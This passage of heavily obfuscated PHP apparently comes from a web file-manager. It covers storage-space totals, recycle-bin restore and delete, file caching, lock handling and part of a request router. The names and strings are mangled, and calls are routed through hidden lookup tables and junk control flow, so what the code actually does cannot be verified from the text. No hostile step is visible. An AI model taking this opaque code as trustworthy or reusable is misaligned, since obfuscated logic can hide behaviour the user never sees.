$‚Ë¾´’…[] = array($«­·ëÌ‡[193], $¯ÌÛÔç[$«­·ëÌ‡[193]], $«­·ëÌ‡[79], $¯ÌÛÔç[$«­·ëÌ‡[79]]); } $this->saveAll($‚Ë¾´’…); } public function userSpaceReset($›‡Ú’Á = false) { $Ş—õåü³ =& $_SERVER[§Êá¸İ]; $‡ñëšØ“ = $this->where(array($Ş—õåü³[190] => self::TYPE_USER, $Ş—õåü³[577] => $›‡Ú’Á, $Ş—õåü³[493] => 0))->sum($Ş—õåü³[79]); $‡ñëšØ“ = !$‡ñëšØ“ || $‡ñëšØ“ <= 0 ? 0 : $‡ñëšØ“; Model($Ş—õåü³[585])->userEdit($›‡Ú’Á, array($Ş—õåü³[1966] => $‡ñëšØ“)); } public function targetSpaceUpdate($ßğßÌÊÀ, $ÓšµèŒ) { $Ö£“Â¬¹ =& $_SERVER[§Êá¸İ]; if (!$ÓšµèŒ) { return; } if (!in_array($ßğßÌÊÀ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $à±±¶¨Í = $this->targetSpaceSize($ßğßÌÊÀ, $ÓšµèŒ); if ($ßğßÌÊÀ == self::TYPE_USER) { Model($Ö£“Â¬¹[585])->userEdit($ÓšµèŒ, array($Ö£“Â¬¹[1966] => $à±±¶¨Í)); } else { if ($ßğßÌÊÀ == self::TYPE_GROUP) { Model($Ö£“Â¬¹[593])->groupEdit($ÓšµèŒ, array($Ö£“Â¬¹[1966] => $à±±¶¨Í)); } } } public function targetSpaceSize($ˆ¯³îÈí, $¶Ş™•Å¡) { $§ªÙıØ¬ =& $_SERVER[§Êá¸İ]; $ÃŒÁ³•÷ = 0; $£œ³Øüí = $this->targetSourceRoot($ˆ¯³îÈí, $¶Ş™•Å¡, !0); foreach ($£œ³Øüí as $êî¾ñÖ) { if (!$êî¾ñÖ) { continue; } $ÃŒÁ³•÷ += floatval($êî¾ñÖ[$§ªÙıØ¬[79]]); $Ş¿ı§Çö = array($§ªÙıØ¬[660] => array($§ªÙıØ¬[620], $§ªÙıØ¬[602] . $êî¾ñÖ[$§ªÙıØ¬[193]] . $§ªÙıØ¬[621])); $­ŠòÕ„È = Model($§ªÙıØ¬[511])->field($§ªÙıØ¬[499])->where($Ş¿ı§Çö)->select(); $­ŠòÕ„È = array_to_keyvalue($­ŠòÕ„È, $§ªÙıØ¬[12], $§ªÙıØ¬[193]); $­ŠòÕ„È = array_unique(array_filter($­ŠòÕ„È)); if ($­ŠòÕ„È) { $Ş¿ı§Çö = array($§ªÙıØ¬[499] => array($§ªÙıØ¬[500], $­ŠòÕ„È)); $ÃŒÁ³•÷ += floatval($this->where($Ş¿ı§Çö)->sum($§ªÙıØ¬[79])); } } $ÃŒÁ³•÷ = !$ÃŒÁ³•÷ || $ÃŒÁ³•÷ <= 0 ? 0 : $ÃŒÁ³•÷; return $ÃŒÁ³•÷; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¤ïÅí¥§) { return $this->fileTypeProfile($¤ïÅí¥§, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Ç†ï€„ô) { return $this->fileTypeProfile($Ç†ï€„ô, SourceModel::TYPE_GROUP); } private function fileTypeProfile($»áƒÄ…·, $Š÷™ç‰ß) { $ìÑÙı =& $_SERVER[§Êá¸İ]; $¦¿Ò§õ = $ìÑÙı[2295] . $»áƒÄ…· . $ìÑÙı[11] . $Š÷™ç‰ß; $ç³‹¤ØÛ = Cache::get($¦¿Ò§õ); if ($ç³‹¤ØÛ) { return $ç³‹¤ØÛ; } $¼¾÷˜š = array($ìÑÙı[654] => 0); if ($»áƒÄ…· != !1) { $¼¾÷˜š[$ìÑÙı[577]] = $»áƒÄ…·; $¼¾÷˜š[$ìÑÙı[190]] = $Š÷™ç‰ß; } $ÖŠÕ¤úÒ = array(); $ÖŠÕ¤úÒ[$ìÑÙı[2296]] = array($ìÑÙı[2297] => LNG($ìÑÙı[2296]), $ìÑÙı[2298] => $this->where($¼¾÷˜š)->count(), $ìÑÙı[625] => $this->where($¼¾÷˜š)->sum($ìÑÙı[79])); $š«×¦¾… = KodIO::fileTypeList(); foreach ($š«×¦¾… as $¹ØÔ¿É— => $Âû„ÍõŞ) { $¼¾÷˜š[$ìÑÙı[494]] = $this->fileTypeWhere($¹ØÔ¿É—); $ÖŠÕ¤úÒ[$¹ØÔ¿É—] = array($ìÑÙı[2297] => $Âû„ÍõŞ[$ìÑÙı[32]], $ìÑÙı[2298] => $this->where($¼¾÷˜š)->count(), $ìÑÙı[625] => $this->where($¼¾÷˜š)->sum($ìÑÙı[79])); } Cache::set($¦¿Ò§õ, $ÖŠÕ¤úÒ, 1200); return $ÖŠÕ¤úÒ; } public function fileNameExist($ªÄñ¨÷, $©óıéÖ) { $±¨ˆØË¹ =& $_SERVER[§Êá¸İ]; $½ÙİÇùç = $this->field($±¨ˆØË¹[2299])->where(array($±¨ˆØË¹[192] => $ªÄñ¨÷, $±¨ˆØË¹[32] => $©óıéÖ, $±¨ˆØË¹[513] => 0))->find(); return is_array($½ÙİÇùç) ? $½ÙİÇùç[$±¨ˆØË¹[193]] : !1; } public function childList($®ÔÑˆ½ú) { $Ğ½ÇŸİ =& $_SERVER[§Êá¸İ]; $·“Á–¤Ú = $Ğ½ÇŸİ[2272] . $®ÔÑˆ½ú; if (isset(self::$cacheChildList[$·“Á–¤Ú])) { return self::$cacheChildList[$·“Á–¤Ú]; } $ğ‡‘ä‰± = array($Ğ½ÇŸİ[192] => intval($®ÔÑˆ½ú), $Ğ½ÇŸİ[513] => 0); $¯‡¿ëª = $this->where($ğ‡‘ä‰±)->select(); $¯‡¿ëª = $¯‡¿ëª ? $¯‡¿ëª : array(); self::$cacheChildList[$·“Á–¤Ú] = $¯‡¿ëª; foreach ($¯‡¿ëª as $Ò»‘¨Áº) { $·“Á–¤Ú = $Ğ½ÇŸİ[541] . $Ò»‘¨Áº[$Ğ½ÇŸİ[193]]; self::$cacheSourceInfo[$·“Á–¤Ú] = $Ò»‘¨Áº; } return $¯‡¿ëª; } public function fileNameAuto($Š¤ñ£è£, $„ƒ€œæö, $ñ‘Á’ßÕ = REPEAT_RENAME, $Âì—±ç± = false) { $íÅû”ø– =& $_SERVER[§Êá¸İ]; $ÕéÓ¸àé = get_path_ext($„ƒ€œæö); $‚¤¶áõ = $ÕéÓ¸àé ? get_path_ext_name($„ƒ€œæö) . $íÅû”ø–[2300] . $ÕéÓ¸àé : $„ƒ€œæö . $íÅû”ø–[460]; $÷ˆúÂ¹ = array($íÅû”ø–[192] => $Š¤ñ£è£, $íÅû”ø–[513] => 0, $íÅû”ø–[32] => array($íÅû”ø–[459], $‚¤¶áõ)); $‰ñåöç = $this->field($íÅû”ø–[32])->where($÷ˆúÂ¹)->select(); $ùâˆ¸¸â = array_to_keyvalue($‰ñåöç, $íÅû”ø–[12], $íÅû”ø–[32]); return $this->fileNameAutoGet($ùâˆ¸¸â, $„ƒ€œæö, $ñ‘Á’ßÕ, $Âì—±ç±); } public function fileNameAutoGet($Ú»€Ëİ†, $˜¦‡‹ó, $Í¤ø•™Ü, $ÍŒ ‘şµ) { $¿±ÆŸÖ† =& $_SERVER[§Êá¸İ]; if ($Í¤ø•™Ü == REPEAT_REPLACE || !$Ú»€Ëİ† || !in_array_not_case($˜¦‡‹ó, $Ú»€Ëİ†) || $ÍŒ ‘şµ && $Í¤ø•™Ü != REPEAT_RENAME_FOLDER) { return $˜¦‡‹ó; } if ($Í¤ø•™Ü == REPEAT_SKIP) { return !1; } $­Ü£´Œé = $¿±ÆŸÖ†[10] . get_path_ext($˜¦‡‹ó); $­Ü£´Œé = $­Ü£´Œé == $¿±ÆŸÖ†[10] || $ÍŒ ‘şµ ? $¿±ÆŸÖ†[12] : $­Ü£´Œé; for ($â‡ŞìÍİ = 1; $â‡ŞìÍİ <= count($Ú»€Ëİ†) + 1; $â‡ŞìÍİ++) { $¤’Ø’üÛ = substr($˜¦‡‹ó, 0, strlen($˜¦‡‹ó) - strlen($­Ü£´Œé)); $–Ïì–úõ = $¤’Ø’üÛ . "\50{$â‡ŞìÍİ}\x29{$­Ü£´Œé}"; if (!in_array_not_case($–Ïì–úõ, $Ú»€Ëİ†)) { return $–Ïì–úõ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\x75\x72\x63\145\x5f\162\145\143\x79\143\x6c\145"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\x65\x54\x69\155\x65", "\x74\x69\155\x65", "\151\156\x73\x65\x72\164", "\x66\x75\156\x63\x74\x69\157\156")); public function listData($šŒöÂâÆ = false) { $À€òÏÈ« =& $_SERVER[§Êá¸İ]; $šŒöÂâÆ = $šŒöÂâÆ ? $šŒöÂâÆ : USER_ID; $‡†–êàĞ = $this->where(array($À€òÏÈ«[1770] => $šŒöÂâÆ))->select(); return array_to_keyvalue($‡†–êàĞ, $À€òÏÈ«[12], $À€òÏÈ«[193]); } public function moveToRecycle($éÈ£ã’İ) { $†Ø»§ =& $_SERVER[§Êá¸İ]; $ÖÛéÈÔÄ = Model($†Ø»§[1428]); $¢Îªî— = $ÖÛéÈÔÄ->sourceInfo($éÈ£ã’İ); if (!$¢Îªî— || $¢Îªî—[$†Ø»§[513]] == $†Ø»§[91]) { return; } $¬ºÏüÀ¢ = array($†Ø»§[499] => $éÈ£ã’İ, $†Ø»§[1770] => USER_ID, $†Ø»§[656] => $¢Îªî—[$†Ø»§[190]], $†Ø»§[657] => $¢Îªî—[$†Ø»§[577]], $†Ø»§[660] => $¢Îªî—[$†Ø»§[592]]); $this->add($¬ºÏüÀ¢); $this->recycleMove($éÈ£ã’İ, 1); if ($¢Îªî—[$†Ø»§[493]] == $†Ø»§[91]) { $À¾—àÌ¬ = array($†Ø»§[660] => array($†Ø»§[620], $¢Îªî—[$†Ø»§[592]] . $éÈ£ã’İ . $†Ø»§[621])); $ÖÛéÈÔÄ->where($À¾—àÌ¬)->setField($†Ø»§[513], 1); } } public function clear() { $this->remove(!1); } public function remove($±¬üŠÃÓ = false, $ğ¢®ÕÚÍ = false) { $˜çø×Şô =& $_SERVER[§Êá¸İ]; $ğ¢®ÕÚÍ = $ğ¢®ÕÚÍ ? $ğ¢®ÕÚÍ : USER_ID; $„Œƒ£Šë = Model($˜çø×Şô[1428]); $—ª»ÖòÄ = $this->listData($ğ¢®ÕÚÍ); $±¬üŠÃÓ = $±¬üŠÃÓ === !1 ? !1 : $±¬üŠÃÓ; $÷Œ÷Úœ = array(); foreach ($—ª»ÖòÄ as $ÀáÅë©) { if ($±¬üŠÃÓ != !1 && !in_array($ÀáÅë©, $±¬üŠÃÓ)) { continue; } $•¨üµÚ• = $„Œƒ£Šë->sourceInfo($ÀáÅë©); $„Œƒ£Šë->remove($ÀáÅë©, !1); $„é²ÈÌÕ = $•¨üµÚ•[$˜çø×Şô[190]] . $˜çø×Şô[11] . $•¨üµÚ•[$˜çø×Şô[577]]; $÷Œ÷Úœ[$„é²ÈÌÕ] = array($˜çø×Şô[656] => $•¨üµÚ•[$˜çø×Şô[190]], $˜çø×Şô[577] => $•¨üµÚ•[$˜çø×Şô[577]]); $this->where(array($˜çø×Şô[193] => $ÀáÅë©))->delete(); } foreach ($÷Œ÷Úœ as $Ü‹àÓƒ„) { $„Œƒ£Šë->targetSpaceUpdate($Ü‹àÓƒ„[$˜çø×Şô[190]], $Ü‹àÓƒ„[$˜çø×Şô[577]]); } } public function restore($¬¾¨ë–² = false) { $ÍıŸ™èÂ = $this->listData(); $this->_restoreSource($ÍıŸ™èÂ, $¬¾¨ë–²); } public function removeUserAll($ÂöÇ»é) { $this->remove(!1, $ÂöÇ»é); } public function restoreItem($­µ†£ë) { $this->_restoreSource(array($­µ†£ë), array($­µ†£ë)); } private function _restoreSource($ïÈÏÓµÆ, $»‚¢¢Ñ¦) { $¯Æ‰·™‰ =& $_SERVER[§Êá¸İ]; $ÆéÂÑ‹‡ = Model($¯Æ‰·™‰[1428]); $»‚¢¢Ñ¦ = $»‚¢¢Ñ¦ == !1 ? !1 : $»‚¢¢Ñ¦; if (!$ïÈÏÓµÆ) { return !0; } $Ñ°ğãÏË = array(); foreach ($ïÈÏÓµÆ as $ğ®Õó²) { if ($»‚¢¢Ñ¦ != !1 && !in_array($ğ®Õó², $»‚¢¢Ñ¦)) { continue; } $ˆ¼¸–¯ = $ÆéÂÑ‹‡->sourceInfo($ğ®Õó²); $¶‘üüè = $ÆéÂÑ‹‡->sourceInfo($ˆ¼¸–¯[$¯Æ‰·™‰[192]]); if ($¶‘üüè[$¯Æ‰·™‰[513]] == $¯Æ‰·™‰[91]) { continue; } $ÆéÂÑ‹‡->lockMoveStart($ğ®Õó²); $this->recycleMove($ğ®Õó², 0); if ($ˆ¼¸–¯[$¯Æ‰·™‰[493]] == $¯Æ‰·™‰[91]) { $Æöî©Ô = array($¯Æ‰·™‰[660] => array($¯Æ‰·™‰[620], $ˆ¼¸–¯[$¯Æ‰·™‰[592]] . $ğ®Õó² . $¯Æ‰·™‰[621])); $ÆéÂÑ‹‡->where($Æöî©Ô)->setField($¯Æ‰·™‰[513], 0); $this->restoreFolderChildren($ğ®Õó², $ïÈÏÓµÆ); } $this->where(array($¯Æ‰·™‰[193] => $ğ®Õó²))->delete(); $ÆéÂÑ‹‡->folderSizeReset($ˆ¼¸–¯[$¯Æ‰·™‰[192]]); $Ñ°ğãÏË[] = $ˆ¼¸–¯[$¯Æ‰·™‰[192]]; if ($ˆ¼¸–¯[$¯Æ‰·™‰[493]] == $¯Æ‰·™‰[91]) { $Ñ°ğãÏË[] = $ğ®Õó²; } $ÆéÂÑ‹‡->lockMoveEnd($ğ®Õó²); } $ÆéÂÑ‹‡->updateModifyTime($Ñ°ğãÏË); } private function restoreFolderChildren($ÓÏ„é, $ûÎÒ·ª) { $£åò³í =& $_SERVER[§Êá¸İ]; $˜çâ¹Üˆ = Model($£åò³í[1428]); $Æ½„„œŸ = array($£åò³í[193] => array($£åò³í[7], array())); foreach ($ûÎÒ·ª as $Á§şÂ¨é) { if ($Á§şÂ¨é == $ÓÏ„é) { continue; } if (!$˜çâ¹Üˆ->isParentOf($ÓÏ„é, $Á§şÂ¨é)) { continue; } $å¸ŸÀ¤å = $˜çâ¹Üˆ->sourceInfo($Á§şÂ¨é); if ($å¸ŸÀ¤å[$£åò³í[493]] == $£åò³í[91]) { $Æ½„„œŸ[] = array($£åò³í[660] => array($£åò³í[620], $å¸ŸÀ¤å[$£åò³í[592]] . $Á§şÂ¨é . $£åò³í[621])); } else { $Æ½„„œŸ[$£åò³í[193]][1][] = $Á§şÂ¨é; } } if (!$Æ½„„œŸ[$£åò³í[193]][1]) { unset($Æ½„„œŸ[$£åò³í[193]]); } if (!$Æ½„„œŸ) { return; } if (is_array($Æ½„„œŸ[$£åò³í[193]]) && is_array($Æ½„„œŸ[$£åò³í[193]][1])) { $Æ½„„œŸ[$£åò³í[193]][1] = array_unique($Æ½„„œŸ[$£åò³í[193]][1]); } $Æ½„„œŸ[$£åò³í[1088]] = $£åò³í[2080]; $˜çâ¹Üˆ->where($Æ½„„œŸ)->setField($£åò³í[513], 1); } private function recycleMove($ÇÅ—äÑÇ, $ÊÚÈ…—ì = 1) { $ıİÁÜªÎ =& $_SERVER[§Êá¸İ]; $¬Ï¬ğ½ = Model($ıİÁÜªÎ[1428]); $ìöóÄ¤· = Model($ıİÁÜªÎ[2301]); $ãûŠ“ş» = array($ıİÁÜªÎ[193] => $ÇÅ—äÑÇ); if ($ÊÚÈ…—ì) { $¬Ï¬ğ½->where($ãûŠ“ş»)->setField($ıİÁÜªÎ[513], 1); $ìöóÄ¤·->eventRecycle($ÇÅ—äÑÇ, $ıİÁÜªÎ[2302]); } else { $ôÁ‹ÛÍä = $¬Ï¬ğ½->where($ãûŠ“ş»)->find(); $´Æ¿›Ê‡ = $ôÁ‹ÛÍä[$ıİÁÜªÎ[493]] == $ıİÁÜªÎ[91]; $§™°ì¬’ = $¬Ï¬ğ½->fileNameAuto($ôÁ‹ÛÍä[$ıİÁÜªÎ[192]], $ôÁ‹ÛÍä[$ıİÁÜªÎ[32]], REPEAT_RENAME_FOLDER, $´Æ¿›Ê‡); if ($§™°ì¬’ != $ôÁ‹ÛÍä[$ıİÁÜªÎ[32]]) { $¬Ï¬ğ½->rename($ÇÅ—äÑÇ, $§™°ì¬’); } $¬Ï¬ğ½->where($ãûŠ“ş»)->setField($ıİÁÜªÎ[513], 0); $ìöóÄ¤·->eventRecycle($ÇÅ—äÑÇ, $ıİÁÜªÎ[2303]); } } } goto A×Ï™ÅéÉ; AœÍ©å”†Â: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($İøÌ¦„ì, $¢–×ÑéØ) { $‘æ¿ªç× =& $_SERVER[§Êá¸İ]; $this->cachePath = $İøÌ¦„ì[$‘æ¿ªç×[87]]; $this->prefix = $‘æ¿ªç×[921]; $this->cacheTime = $¢–×ÑéØ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($”ûö½‡) { $…·ı×³ =& $_SERVER[§Êá¸İ]; $”ûö½‡ = str_replace(array($…·ı×³[922], $…·ı×³[100], $…·ı×³[76]), $…·ı×³[923], $”ûö½‡); return $this->cachePath . $…·ı×³[924] . $”ûö½‡ . $…·ı×³[925]; } public function set($†Ó¬Àåé, $ºß€æ¦, $š‚ŞªÌº = false) { $š‚ŞªÌº = $š‚ŞªÌº ? $š‚ŞªÌº : $this->cacheTime; $ŒÅá„Í = $this->getFile($†Ó¬Àåé); if (file_put_contents($ŒÅá„Í, $this->prefix . $ºß€æ¦, LOCK_EX)) { @touch($ŒÅá„Í, intval(time() + $š‚ŞªÌº)); clearstatcache(); return !0; } @unlink($ŒÅá„Í); return !1; } public function get($ˆÜÏÍÙ¸) { $„À¾™°¾ = $this->getFile($ˆÜÏÍÙ¸); if (file_exists($„À¾™°¾) && filemtime($„À¾™°¾) < time()) { @unlink($„À¾™°¾); return !1; } $‚Ğ’×ë = @file_get_contents($„À¾™°¾); return substr($‚Ğ’×ë, strlen($this->prefix)); } public function remove($ÌË³ğŸ) { $¬™»ä’· = $this->getFile($ÌË³ğŸ); return @unlink($¬™»ä’·); } public function deleteAll() { $ŸóÁÕç =& $_SERVER[§Êá¸İ]; $ÇîÑÂÄÌ = scandir($this->cachePath); foreach ($ÇîÑÂÄÌ as $Æøğ©——) { $İì˜úø¯ = $this->cachePath . $Æøğ©——; if (strpos($İì˜úø¯, $ŸóÁÕç[925]) && strpos($İì˜úø¯, $ŸóÁÕç[926])) { @unlink($İì˜úø¯); } } } public function clearTimeout() { $»óÆõŞÁ =& $_SERVER[§Êá¸İ]; $â´òº÷‰ = scandir($this->cachePath); foreach ($â´òº÷‰ as $›ÕÜÈ¬‡) { $ÑñìÌï = $this->cachePath . $›ÕÜÈ¬‡; if (strpos($ÑñìÌï, $»óÆõŞÁ[925]) && strpos($ÑñìÌï, $»óÆõŞÁ[926]) && filemtime($ÑñìÌï) < time()) { @unlink($ÑñìÌï); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $’Äğè‡ =& $_SERVER[§Êá¸İ]; if (self::$handle) { return self::$handle; } $…â£ô€¼ = $GLOBALS[$’Äğè‡[6]][$’Äğè‡[425]]; self::$timeout = $…â£ô€¼[$’Äğè‡[927]] ? $…â£ô€¼[$’Äğè‡[927]] : 10; $†‡–’ë = _get($GLOBALS[$’Äğè‡[6]], $’Äğè‡[928]); $ÕÕ÷ÄÆ™ = $…â£ô€¼[$’Äğè‡[913]] ? $…â£ô€¼[$’Äğè‡[913]] : $’Äğè‡[230]; if ($ÕÕ÷ÄÆ™ == $’Äğè‡[21] && $†‡–’ë == $’Äğè‡[13]) { $ÕÕ÷ÄÆ™ = $’Äğè‡[230]; } switch ($ÕÕ÷ÄÆ™) { case $’Äğè‡[916]: self::$handle = new CacheLockRedis(); break; case $’Äğè‡[917]: self::$handle = new CacheLockMemcached(); break; case $’Äğè‡[21]: self::$handle = new CacheLockDatabase(); break; case $’Äğè‡[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($’Äğè‡[929], $’Äğè‡[930]); } return self::$handle; } private static function key($ÎÀôÙª) { return $_SERVER[§Êá¸İ][931] . Cache::key($ÎÀôÙª); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($îÀÙºÜ = '') { self::$errorMsg = $îÀÙºÜ; } public static function lockGlobal($™–î‹ÑÁ, $ÄŞ¼à¶ı) { return self::lock($™–î‹ÑÁ, $ÄŞ¼à¶ı, !0); } public static function lock($ğ©‰á¨Á, $ˆÉˆÍï¥ = false, $¯é¦©Äõ = false) { $£¡ëû•‰ =& $_SERVER[§Êá¸İ]; $Ïö²‰Œ = self::init(); $‰ëäÌÉ€ = self::key($ğ©‰á¨Á); $ˆÉˆÍï¥ = $ˆÉˆÍï¥ ? $ˆÉˆÍï¥ : self::$timeout; $¼œñŒŸ« = timeFloat(); $âÒ„³Ç¯ = $Ïö²‰Œ->lock($‰ëäÌÉ€, $ˆÉˆÍï¥); $ã¢ÅŠ¬† = timeFloat(); if (!$âÒ„³Ç¯) { $ûÙ—ÆÔÒ = "\x6c\x6f\143\x6b\x20\145\162\x72\x6f\x72\73\x6b\x65\171\x3d{$ğ©‰á¨Á}\x3b\x74\x69\x6d\145\x3d{$ˆÉˆÍï¥}\x3b" . self::$errorMsg . $£¡ëû•‰[74] . get_caller_msg(); $ü¼¹ ‚Ù = LNG($£¡ëû•‰[932]) . "\50{$ˆÉˆÍï¥}\x73\x29\56" . LNG($£¡ëû•‰[933]); $ü¼¹ ‚Ù .= $£¡ëû•‰[934]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ü¼¹ ‚Ù = $ü¼¹ ‚Ù . $£¡ëû•‰[935] . self::$errorMsg; } write_log($£¡ëû•‰[936] . sprintf($£¡ëû•‰[937], timeFloat() - $¼œñŒŸ«) . $£¡ëû•‰[938] . $ûÙ—ÆÔÒ . $£¡ëû•‰[939] . error_get_last(), $£¡ëû•‰[930]); show_json($ü¼¹ ‚Ù, !1); } if (!$¯é¦©Äõ) { self::$lockItem[$‰ëäÌÉ€] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ìµÒà÷Š = number_format(timeFloat() - $ã¢ÅŠ¬†, 3); write_log($£¡ëû•‰[940] . $ğ©‰á¨Á . $£¡ëû•‰[941] . $ìµÒà÷Š, $£¡ëû•‰[930]); } return $âÒ„³Ç¯; } public static function lockGet($•û”Ê) { $×œ„²İ¨ = self::key($•û”Ê); if (self::$lockItem[$×œ„²İ¨]) { return self::$lockItem[$×œ„²İ¨]; } return self::init()->lockGet($×œ„²İ¨); } public static function unlock($²²Ê§“) { $õßÜ¹© =& $_SERVER[§Êá¸İ]; $•°÷°üÌ = self::key($²²Ê§“); self::$lockItem[$•°÷°üÌ] = null; self::init()->unlock($•°÷°üÌ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($õßÜ¹©[942] . $²²Ê§“, $õßÜ¹©[930]); } return; } public static function unlockRuntime() { $›«£±œ =& $_SERVER[§Êá¸İ]; $¿‰œüĞÑ = self::init(); $‚Â•øàç = !1; foreach (self::$lockItem as $­ÚÜ‰ => $ÒóíŠ€Ä) { if (!$ÒóíŠ€Ä) { continue; } $¿‰œüĞÑ->unlock($­ÚÜ‰); if (!$‚Â•øàç) { $‚Â•øàç = !0; write_log($›«£±œ[943] . $­ÚÜ‰ . $›«£±œ[74] . get_caller_msg(), $›«£±œ[930]); continue; } write_log($›«£±œ[943] . $­ÚÜ‰, $›«£±œ[930]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¸¡î³”œ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($›«£±œ[944] . $¸¡î³”œ . $›«£±œ[945] . ACTION, $›«£±œ[930]); } } public static function fileLock($íû«àå¦) { $œŠæ™ã‹ =& $_SERVER[§Êá¸İ]; if (!$GLOBALS[$œŠæ™ã‹[946]]) { $GLOBALS[$œŠæ™ã‹[946]] = array(); } $GLOBALS[$œŠæ™ã‹[946]][$íû«àå¦] = !1; $áêç‘ö‰ = fopen(DATA_PATH . $íû«àå¦ . $œŠæ™ã‹[947], $œŠæ™ã‹[948]); if (!$áêç‘ö‰) { return !1; } $GLOBALS[$œŠæ™ã‹[946]][$íû«àå¦] = $áêç‘ö‰; if (flock($áêç‘ö‰, LOCK_EX)) { return !0; } self::unlock($íû«àå¦); show_json($œŠæ™ã‹[949], !1); return !1; } public static function fileUnlock($°ìÎçš±) { $ üÎèÒÜ =& $_SERVER[§Êá¸İ]; $¥°”‰Ó = $GLOBALS[$ üÎèÒÜ[946]][$°ìÎçš±]; if (!$¥°”‰Ó) { return; } $GLOBALS[$ üÎèÒÜ[946]][$°ìÎçš±] = !1; flock($¥°”‰Ó, LOCK_UN); fclose($¥°”‰Ó); } public static function fileUnlockAll() { $³³†ãú =& $_SERVER[§Êá¸İ]; if (!isset($GLOBALS[$³³†ãú[946]]) || !$GLOBALS[$³³†ãú[946]]) { return; } foreach ($GLOBALS[$³³†ãú[946]] as $ş“ı¡• => $‚ƒÕ»¹ª) { if (!$‚ƒÕ»¹ª) { continue; } $GLOBALS[$³³†ãú[946]][$ş“ı¡•] = !1; flock($‚ƒÕ»¹ª, LOCK_UN); fclose($‚ƒÕ»¹ª); } $GLOBALS[$³³†ãú[946]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto B¼‘±‹Á¦; DÀİà³…‹§: class Application { private $defaultModule = "\151\x6e\x64\145\x78"; private $defaultController = "\x69\x6e\144\x65\x78"; private $defaultAction = "\x69\x6e\x64\x65\170"; function __construct() { } public function setDefault($ŸÅ»Ú¶å) { $Ÿ°œ·å =& $_SERVER[§Êá¸İ]; $ÙÃ³ÎËº =& $_SERVER[ÌÛŒïÀ]; $½À‚Ø¸ü = explode($ÙÃ³ÎËº[0], trim($ŸÅ»Ú¶å, $ÙÃ³ÎËº[0])); $©±Ô¡Ç = $Ÿ°œ·å[693]; $this->defaultModule = $½À‚Ø¸ü[0] ? $½À‚Ø¸ü[0] : $this->defaultModule; $this->defaultController = $½À‚Ø¸ü[1] ? $½À‚Ø¸ü[1] : $this->defaultController; $¥åŒÍ˜· = $Ÿ°œ·å[694]; if (strlen($¥åŒÍ˜·) < $Ÿ°œ·å[695]) { return; } $this->defaultAction = $½À‚Ø¸ü[2] ? $½À‚Ø¸ü[2] : $this->defaultAction; $this->heiud1ec239f($ÙÃ³ÎËº[1], array($this, $ÙÃ³ÎËº[2])); } public function appRun($ƒêÃòä¼) { $Ğ©Òİ½· =& $_SERVER[§Êá¸İ]; $ö…Ìâ• =& $_SERVER[ÌÛŒïÀ]; $¼é´°ú = explode($ö…Ìâ•[0], $ƒêÃòä¼); $ç¶¡Èì = $Ğ©Òİ½·[696]; while (strlen($ç¶¡Èì) < $Ğ©Òİ½·[688]) { if (!$ç¶¡Èì) { break; } $ç¶¡Èì++; } $àÆñû•¾ = strtolower($¼é´°ú[0]); $ù¼âÒÒğ = $ö…Ìâ•[3]; $´Í¯›¯ = $Ğ©Òİ½·[697]; if (!$´Í¯›¯) { die; } if ($àÆñû•¾ == $ö…Ìâ•[4]) { $ù¼âÒÒğ = $ö…Ìâ•[5]; $¼é´°ú[0] = $ö…Ìâ•[6]; $¼é´°ú[1] = $¼é´°ú[1] . $ö…Ìâ•[7]; $ƒêÃòä¼ = join($ö…Ìâ•[0], $¼é´°ú); $ƒêÃòä¼ = trim($ƒêÃòä¼, $ö…Ìâ•[0]); } call_user_func(array($ö…Ìâ•[8], $ö…Ìâ•[9]), $ù¼âÒÒğ . $ö…Ìâ•[10], $ƒêÃòä¼); ActionCall($ƒêÃòä¼); call_user_func(array($ö…Ìâ•[8], $ö…Ìâ•[9]), $ù¼âÒÒğ . $ö…Ìâ•[11], $ƒêÃòä¼); $ıİŞîÈï = $Ğ©Òİ½·[698]; while ($ıİŞîÈï < $Ğ©Òİ½·[688]) { if ($ıİŞîÈï >= 0) { break; } $ıİŞîÈï++; } } private function autorun() { $£îı˜¹­ =& $_SERVER[§Êá¸İ]; $«†–¿ı§ =& $_SERVER[ÌÛŒïÀ]; global $config; $¼àŒ£ïü = $£îı˜¹­[699]; if (strlen($¼àŒ£ïü) < $£îı˜¹­[700]) { return; } if (count($config[$«†–¿ı§[12]]) == 0) { return; } foreach ($config[$«†–¿ı§[12]] as $èì ›Æü => $Ùìæô˜) { $this->appRun($Ùìæô˜); $«†ê¸ñÌ = $£îı˜¹­[701]; if (!$«†ê¸ñÌ) { return; } } } private function gslfbb472dfd() { $È°¡ÔÕ =& $_SERVER[§Êá¸İ]; $¦üšÕä¾ =& $_SERVER[ÌÛŒïÀ]; $³¡Óè­ = $¦üšÕä¾[4]; $ñúë˜…„ = $GLOBALS[$¦üšÕä¾[13]][$¦üšÕä¾[14]][0]; if (!$ñúë˜…„ || strlen($ñúë˜…„) <= strlen($³¡Óè­)) { return; } if (strtolower(substr($ñúë˜…„, -strlen($³¡Óè­))) != $³¡Óè­) { return; } $÷Õ²Š¿Ú = substr($ñúë˜…„, 0, -strlen($³¡Óè­)); $Ù ®ÓÅø = $È°¡ÔÕ[702]; $½‘æÃÌ = array($¦üšÕä¾[4], $÷Õ²Š¿Ú); $šĞç¾¹€ = $È°¡ÔÕ[703]; $×ÚÖæ€÷ = array_slice($GLOBALS[$¦üšÕä¾[13]][$¦üšÕä¾[14]], 1); $GLOBALS[$¦üšÕä¾[13]][$¦üšÕä¾[14]] = array_merge($½‘æÃÌ, $×ÚÖæ€÷); 